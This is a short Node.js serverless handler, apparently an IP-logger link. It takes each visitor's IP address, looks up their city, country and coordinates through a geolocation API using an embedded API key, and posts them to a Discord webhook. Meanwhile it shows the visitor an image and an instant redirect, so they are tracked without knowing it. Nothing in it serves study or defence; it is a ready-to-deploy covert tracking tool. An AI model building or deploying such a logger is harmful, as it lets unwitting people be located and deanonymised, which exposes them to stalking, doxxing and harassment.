const fetch = require("node-fetch"); // Node fetch for HTTP requests

module.exports = async (req, res) => {
  // Step 1: Get the user's public IP address
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Step 2: Use the IP to get location data
  const geoResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=654dc7809bd72d&ip=${ip}`);
  const geoData = await geoResponse.json();

  // Step 3: Format the message to send to the Discord webhook
  const discordMessage = {
    content: `New visitor with IP: ${geoData.ip}\nLocation: ${geoData.city}, ${geoData.country_name}\nCoordinates: ${geoData.latitude}, ${geoData.longitude}`
  };

  // Step 4: Send the IP and location data to the Discord webhook
  await fetch('YOUR_DISCORD_WEBHOOK_URL', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(discordMessage)
  });

  // Step 5: Serve an HTML page that shows the image and then redirects the user
  res.setHeader('Content-Type', 'text/html');
  res.send(`
    <html>
      <head>
        <meta http-equiv="refresh" content="0;url=https://sites.google.com/view/heyheyggs/home" />
      </head>
      <body>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTc9APxkj0xClmrU3PpMZglHQkx446nQPG6lA&s" alt="Redirecting..." style="width: 100%; height: auto;" />
      </body>
    </html>
  `);
};
